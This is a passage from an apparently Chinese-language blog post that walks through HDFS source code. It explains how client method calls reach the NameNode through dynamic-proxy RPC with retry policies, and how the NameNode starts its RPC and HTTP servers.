<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* DistributedFileSystem.java */</span>
</span><span class='line'><span class="kd">public</span> <span class="kt">void</span> <span class="nf">initialize</span><span class="o">(</span><span class="n">URI</span> <span class="n">uri</span><span class="o">,</span> <span class="n">Configuration</span> <span class="n">conf</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="kd">super</span><span class="o">.</span><span class="na">initialize</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="n">conf</span><span class="o">);</span>
</span><span class='line'>    <span class="n">setConf</span><span class="o">(</span><span class="n">conf</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">String</span> <span class="n">host</span> <span class="o">=</span> <span class="n">uri</span><span class="o">.</span><span class="na">getHost</span><span class="o">();</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">host</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">throw</span> <span class="k">new</span> <span class="nf">IOException</span><span class="o">(</span><span class="s">&quot;Incomplete HDFS URI, no host: &quot;</span><span class="o">+</span> <span class="n">uri</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">InetSocketAddress</span> <span class="n">namenode</span> <span class="o">=</span> <span class="n">NameNode</span><span class="o">.</span><span class="na">getAddress</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getAuthority</span><span class="o">());</span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">dfs</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DFSClient</span><span class="o">(</span><span class="n">namenode</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span> <span class="n">statistics</span><span class="o">);</span> <span class="c1">// 创建了DFSClient的实例</span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">uri</span> <span class="o">=</span> <span class="n">URI</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">uri</span><span class="o">.</span><span class="na">getScheme</span><span class="o">()+</span><span class="s">&quot;://&quot;</span><span class="o">+</span><span class="n">uri</span><span class="o">.</span><span class="na">getAuthority</span><span class="o">());</span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">workingDir</span> <span class="o">=</span> <span class="n">getHomeDirectory</span><span class="o">();</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* DFSClient.java */</span>
</span><span class='line'><span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">mkdirs</span><span class="o">(</span><span class="n">String</span> <span class="n">src</span><span class="o">,</span> <span class="n">FsPermission</span> <span class="n">permission</span><span class="o">)</span><span class="kd">throws</span> <span class="n">IOException</span><span class="o">{</span>
</span><span class='line'>    <span class="c1">// omitted</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">namenode</span><span class="o">.</span><span class="na">mkdirs</span><span class="o">(</span><span class="n">src</span><span class="o">,</span> <span class="n">masked</span><span class="o">);</span>
</span><span class='line'>    <span class="c1">// omitted</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/** </span>
</span><span class='line'><span class="cm">* Create a new DFSClient connected to the given nameNodeAddr or rpcNamenode.</span>
</span><span class='line'><span class="cm">* Exactly one of nameNodeAddr or rpcNamenode must be null.</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'><span class="n">DFSClient</span><span class="o">(</span><span class="n">InetSocketAddress</span> <span class="n">nameNodeAddr</span><span class="o">,</span> <span class="n">ClientProtocol</span> <span class="n">rpcNamenode</span><span class="o">,</span>
</span><span class='line'>  <span class="n">Configuration</span> <span class="n">conf</span><span class="o">,</span> <span class="n">FileSystem</span><span class="o">.</span><span class="na">Statistics</span> <span class="n">stats</span><span class="o">)</span>
</span><span class='line'><span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="c1">// omitted</span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">rpcNamenode</span> <span class="o">=</span> <span class="n">createRPCNamenode</span><span class="o">(</span><span class="n">nameNodeAddr</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span> <span class="n">ugi</span><span class="o">);</span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">namenode</span> <span class="o">=</span> <span class="n">createNamenode</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">rpcNamenode</span><span class="o">);</span>
</span><span class='line'>    <span class="c1">// omitted</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">private</span> <span class="kd">static</span> <span class="n">ClientProtocol</span> <span class="nf">createRPCNamenode</span><span class="o">(</span><span class="n">InetSocketAddress</span> <span class="n">nameNodeAddr</span><span class="o">,</span>
</span><span class='line'>  <span class="n">Configuration</span> <span class="n">conf</span><span class="o">,</span> <span class="n">UserGroupInformation</span> <span class="n">ugi</span><span class="o">)</span>
</span><span class='line'>    <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="o">(</span><span class="n">ClientProtocol</span><span class="o">)</span><span class="n">RPC</span><span class="o">.</span><span class="na">getProxy</span><span class="o">(</span><span class="n">ClientProtocol</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
</span><span class='line'>        <span class="n">ClientProtocol</span><span class="o">.</span><span class="na">versionID</span><span class="o">,</span> <span class="n">nameNodeAddr</span><span class="o">,</span> <span class="n">ugi</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span>
</span><span class='line'>        <span class="n">NetUtils</span><span class="o">.</span><span class="na">getSocketFactory</span><span class="o">(</span><span class="n">conf</span><span class="o">,</span> <span class="n">ClientProtocol</span><span class="o">.</span><span class="na">class</span><span class="o">));</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* RPC.java */</span>
</span><span class='line'><span class="cm">/** Construct a client-side proxy object that implements the named protocol,</span>
</span><span class='line'><span class="cm"> * talking to a server at the named address. */</span>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">VersionedProtocol</span> <span class="nf">getProxy</span><span class="o">(</span>
</span><span class='line'>        <span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">VersionedProtocol</span><span class="o">&gt;</span> <span class="n">protocol</span><span class="o">,</span>
</span><span class='line'>        <span class="kt">long</span> <span class="n">clientVersion</span><span class="o">,</span> <span class="n">InetSocketAddress</span> <span class="n">addr</span><span class="o">,</span> <span class="n">UserGroupInformation</span> <span class="n">ticket</span><span class="o">,</span>
</span><span class='line'>        <span class="n">Configuration</span> <span class="n">conf</span><span class="o">,</span> <span class="n">SocketFactory</span> <span class="n">factory</span><span class="o">,</span> <span class="kt">int</span> <span class="n">rpcTimeout</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">UserGroupInformation</span><span class="o">.</span><span class="na">isSecurityEnabled</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">SaslRpcServer</span><span class="o">.</span><span class="na">init</span><span class="o">(</span><span class="n">conf</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="n">VersionedProtocol</span> <span class="n">proxy</span> <span class="o">=</span>
</span><span class='line'>        <span class="o">(</span><span class="n">VersionedProtocol</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span>
</span><span class='line'>                <span class="n">protocol</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span> <span class="n">protocol</span> <span class="o">},</span>
</span><span class='line'>                <span class="k">new</span> <span class="nf">Invoker</span><span class="o">(</span><span class="n">protocol</span><span class="o">,</span> <span class="n">addr</span><span class="o">,</span> <span class="n">ticket</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span> <span class="n">factory</span><span class="o">,</span> <span class="n">rpcTimeout</span><span class="o">));</span>
</span><span class='line'>    <span class="kt">long</span> <span class="n">serverVersion</span> <span class="o">=</span> <span class="n">proxy</span><span class="o">.</span><span class="na">getProtocolVersion</span><span class="o">(</span><span class="n">protocol</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span>
</span><span class='line'>            <span class="n">clientVersion</span><span class="o">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">serverVersion</span> <span class="o">==</span> <span class="n">clientVersion</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">proxy</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">throw</span> <span class="k">new</span> <span class="nf">VersionMismatch</span><span class="o">(</span><span class="n">protocol</span><span class="o">.</span><span class="na">getName</span><span class="o">(),</span> <span class="n">clientVersion</span><span class="o">,</span>
</span><span class='line'>                <span class="n">serverVersion</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">private</span> <span class="kd">static</span> <span class="n">ClientProtocol</span> <span class="nf">createNamenode</span><span class="o">(</span><span class="n">ClientProtocol</span> <span class="n">rpcNamenode</span><span class="o">)</span>
</span><span class='line'>    <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">RetryPolicy</span> <span class="n">createPolicy</span> <span class="o">=</span> <span class="n">RetryPolicies</span><span class="o">.</span><span class="na">retryUpToMaximumCountWithFixedSleep</span><span class="o">(</span>
</span><span class='line'>            <span class="mi">5</span><span class="o">,</span> <span class="n">LEASE_SOFTLIMIT_PERIOD</span><span class="o">,</span> <span class="n">TimeUnit</span><span class="o">.</span><span class="na">MILLISECONDS</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">Map</span><span class="o">&lt;</span><span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">Exception</span><span class="o">&gt;,</span><span class="n">RetryPolicy</span><span class="o">&gt;</span> <span class="n">remoteExceptionToPolicyMap</span> <span class="o">=</span>
</span><span class='line'>        <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">Exception</span><span class="o">&gt;,</span> <span class="n">RetryPolicy</span><span class="o">&gt;();</span>
</span><span class='line'>    <span class="n">remoteExceptionToPolicyMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">AlreadyBeingCreatedException</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">createPolicy</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">Map</span><span class="o">&lt;</span><span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">Exception</span><span class="o">&gt;,</span><span class="n">RetryPolicy</span><span class="o">&gt;</span> <span class="n">exceptionToPolicyMap</span> <span class="o">=</span>
</span><span class='line'>        <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">Exception</span><span class="o">&gt;,</span> <span class="n">RetryPolicy</span><span class="o">&gt;();</span>
</span><span class='line'>    <span class="n">exceptionToPolicyMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">RemoteException</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
</span><span class='line'>            <span class="n">RetryPolicies</span><span class="o">.</span><span class="na">retryByRemoteException</span><span class="o">(</span>
</span><span class='line'>                <span class="n">RetryPolicies</span><span class="o">.</span><span class="na">TRY_ONCE_THEN_FAIL</span><span class="o">,</span> <span class="n">remoteExceptionToPolicyMap</span><span class="o">));</span> <span class="c1">// 控制retry的策略 TRY_ONCE_THEN_FAIL</span>
</span><span class='line'>    <span class="n">RetryPolicy</span> <span class="n">methodPolicy</span> <span class="o">=</span> <span class="n">RetryPolicies</span><span class="o">.</span><span class="na">retryByException</span><span class="o">(</span>
</span><span class='line'>            <span class="n">RetryPolicies</span><span class="o">.</span><span class="na">TRY_ONCE_THEN_FAIL</span><span class="o">,</span> <span class="n">exceptionToPolicyMap</span><span class="o">);</span>
</span><span class='line'>    <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">RetryPolicy</span><span class="o">&gt;</span> <span class="n">methodNameToPolicyMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">RetryPolicy</span><span class="o">&gt;();</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">methodNameToPolicyMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;create&quot;</span><span class="o">,</span> <span class="n">methodPolicy</span><span class="o">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">return</span> <span class="o">(</span><span class="n">ClientProtocol</span><span class="o">)</span> <span class="n">RetryProxy</span><span class="o">.</span><span class="na">create</span><span class="o">(</span><span class="n">ClientProtocol</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
</span><span class='line'>            <span class="n">rpcNamenode</span><span class="o">,</span> <span class="n">methodNameToPolicyMap</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>可以看到DFSClient又将方法调用转交给了实例变量namenode，于是我们就要了解namenode和与其有关的rpcNamenode这两个实例变量。对于DFSClient的构造函数，这里只显示最重要的两样东西分别是namenode和rpcNamenode。要了解这两样东西首先需要了解Java的<a href="http://docs.oracle.com/javase/1.4.2/docs/guide/reflection/proxy.html">Dynamic Proxy</a>。我们可以看到rpcNamenode实现了ClientProtocol接口，这个接口就规定了client能向server调用的所有方法。按照Dynamic Proxy的机制我们知道所有对rpcNamenode的方法调用全部归结到了Invoker的<code>invoke()</code>方法上了，这个方法就是将client的调用信息如调用的方法，参数等通过socket传递给server，并获得返回结果。对于Invoker的<code>invoke()</code>方法的剖析这里就不在描述了，可以通过参考链接了解更多。至此client的方法调用就顺利传递到server了。照这样看DFSClient就只要调用rpcNamenode的<code>mkdirs()</code>方法就好了，为什么还要namenode呢？要了解这个就需要RetryProxy的代码了：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* RetryProxy.java */</span>
</span><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">Object</span> <span class="nf">create</span><span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;</span> <span class="n">iface</span><span class="o">,</span> <span class="n">Object</span> <span class="n">implementation</span><span class="o">,</span>
</span><span class='line'>        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">RetryPolicy</span><span class="o">&gt;</span> <span class="n">methodNameToPolicyMap</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span>
</span><span class='line'>            <span class="n">implementation</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">(),</span>
</span><span class='line'>            <span class="k">new</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="o">{</span> <span class="n">iface</span> <span class="o">},</span>
</span><span class='line'>            <span class="k">new</span> <span class="nf">RetryInvocationHandler</span><span class="o">(</span><span class="n">implementation</span><span class="o">,</span> <span class="n">methodNameToPolicyMap</span><span class="o">)</span>
</span><span class='line'>            <span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* RetryInvocationHandler.java */</span>
</span><span class='line'><span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span>
</span><span class='line'>    <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">RetryPolicy</span> <span class="n">policy</span> <span class="o">=</span> <span class="n">methodNameToPolicyMap</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">policy</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="n">policy</span> <span class="o">=</span> <span class="n">defaultPolicy</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kt">int</span> <span class="n">retries</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
</span><span class='line'>    <span class="k">while</span> <span class="o">(</span><span class="kc">true</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="nf">invokeMethod</span><span class="o">(</span><span class="n">method</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
</span><span class='line'>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>            <span class="k">if</span> <span class="o">(!</span><span class="n">policy</span><span class="o">.</span><span class="na">shouldRetry</span><span class="o">(</span><span class="n">e</span><span class="o">,</span> <span class="n">retries</span><span class="o">++))</span> <span class="o">{</span>
</span><span class='line'>                <span class="n">LOG</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">&quot;Exception while invoking &quot;</span> <span class="o">+</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span>
</span><span class='line'>                        <span class="o">+</span> <span class="s">&quot; of &quot;</span> <span class="o">+</span> <span class="n">implementation</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">&quot;. Not retrying.&quot;</span>
</span><span class='line'>                        <span class="o">+</span> <span class="n">StringUtils</span><span class="o">.</span><span class="na">stringifyException</span><span class="o">(</span><span class="n">e</span><span class="o">));</span>
</span><span class='line'>                <span class="k">if</span> <span class="o">(!</span><span class="n">method</span><span class="o">.</span><span class="na">getReturnType</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">Void</span><span class="o">.</span><span class="na">TYPE</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>                    <span class="k">throw</span> <span class="n">e</span><span class="o">;</span> <span class="c1">// non-void methods can&#39;t fail without an exception</span>
</span><span class='line'>                <span class="o">}</span>
</span><span class='line'>                <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
</span><span class='line'>            <span class="o">}</span>
</span><span class='line'>            <span class="n">LOG</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&quot;Exception while invoking &quot;</span> <span class="o">+</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">()</span>
</span><span class='line'>                    <span class="o">+</span> <span class="s">&quot; of &quot;</span> <span class="o">+</span> <span class="n">implementation</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span> <span class="o">+</span> <span class="s">&quot;. Retrying.&quot;</span>
</span><span class='line'>                    <span class="o">+</span> <span class="n">StringUtils</span><span class="o">.</span><span class="na">stringifyException</span><span class="o">(</span><span class="n">e</span><span class="o">));</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">private</span> <span class="n">Object</span> <span class="nf">invokeMethod</span><span class="o">(</span><span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
</span><span class='line'>    <span class="k">try</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="o">(!</span><span class="n">method</span><span class="o">.</span><span class="na">isAccessible</span><span class="o">())</span> <span class="o">{</span>
</span><span class='line'>            <span class="n">method</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">method</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">implementation</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InvocationTargetException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">throw</span> <span class="n">e</span><span class="o">.</span><span class="na">getCause</span><span class="o">();</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>可以看到对于namenode的方法调用都归结到RetryInvocationHandler的<code>invoke()</code>上了，而这个方法就通过反射再调用rpcNamenode的对应方法，只不过它会retry，也就是说如果调用失败的话，它还会重新尝试调用，这么一来可靠性就增强了，毕竟网络传输很容易出问题的。如果让DFSClient直接调用rpcNamenode的话，一旦失败就会立刻告诉用户，而其实如果多尝试几次还是可能会成功的，这就是为什么要引入namenode的原因了。至此我们就知道client是如何将用户对DistributedFileSystem的方法调用传递到server端的，最后用一张图来总结。</p>

<p><img src="http://JiajunYao.github.com/images/post/hdfs-source-code-analysis/hdfs_client_send_request.png"></p>

<p>参考链接：
<a href="http://blog.csdn.net/historyasamirror/article/details/6159248">1</a>
<a href="http://caibinbupt.iteye.com/blog/280790">2</a>
<a href="http://caibinbupt.iteye.com/blog/281281">3</a>
<a href="http://caibinbupt.iteye.com/blog/281476">4</a>
<a href="http://http://blog.csdn.net/xhh198781/article/details/7268298">5</a>
<a href="http://assets.en.oreilly.com/1/event/12/HDFS%20Under%20the%20Hood%20Presentation%201.pdf">6</a></p>

<h2><a id="hdfs_server_handle_client_request"></a> HDFS服务器对客户端请求的处理</h2>

<p>上面我们提到了客户端如何将rpc方法调用的请求传送给了HDFS服务器也就是namenode，在这一节就要看一下服务器是如何接受请求并处理的。首先看的是org.apache.hadoop.hdfs.server.namenode的代码，这个类代表了HDFS中的namenode。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="cm">/* NameNode.java */</span>
</span><span class='line'><span class="kd">private</span> <span class="kt">void</span> <span class="nf">initialize</span><span class="o">(</span><span class="n">Configuration</span> <span class="n">conf</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
</span><span class='line'>    <span class="c1">// omitted </span>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">serviceRpcServer</span> <span class="o">=</span> <span class="n">RPC</span><span class="o">.</span><span class="na">getServer</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">dnSocketAddr</span><span class="o">.</span><span class="na">getHostName</span><span class="o">(),</span>
</span><span class='line'>            <span class="n">dnSocketAddr</span><span class="o">.</span><span class="na">getPort</span><span class="o">(),</span> <span class="n">serviceHandlerCount</span><span class="o">,</span>
</span><span class='line'>            <span class="kc">false</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span> <span class="n">namesystem</span><span class="o">.</span><span class="na">getDelegationTokenSecretManager</span><span class="o">());</span> <span class="c1">// handle request from datanode</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">server</span> <span class="o">=</span> <span class="n">RPC</span><span class="o">.</span><span class="na">getServer</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">socAddr</span><span class="o">.</span><span class="na">getHostName</span><span class="o">(),</span> <span class="c1">// namenode将自己的实例传进去了，将来server就会调用namenode的方法来完成请求，比如namenode.mkdirs</span>
</span><span class='line'>        <span class="n">socAddr</span><span class="o">.</span><span class="na">getPort</span><span class="o">(),</span> <span class="n">handlerCount</span><span class="o">,</span> <span class="kc">false</span><span class="o">,</span> <span class="n">conf</span><span class="o">,</span> <span class="n">namesystem</span>
</span><span class='line'>        <span class="o">.</span><span class="na">getDelegationTokenSecretManager</span><span class="o">());</span> <span class="c1">// handle request from client</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">startHttpServer</span><span class="o">(</span><span class="n">conf</span><span class="o">);</span> <span class="c1">// handle request from http </span>
</span><span class='line'>
</span><span class='line'>    <span class="k">this</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>  <span class="c1">//start RPC server   </span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">serviceRpcServer</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>      <span class="n">serviceRpcServer</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="c1">// omitted</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>可以看到在初始化NameNode时一共开启了三个服务器，其中serviceRpcServer是用来处理datanode的请求，比如datanode要定期发送心跳包。server是用来处理client的请求。最后还有一个http服务器。因此我们这里只关心server服务器而忽略其他两个。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
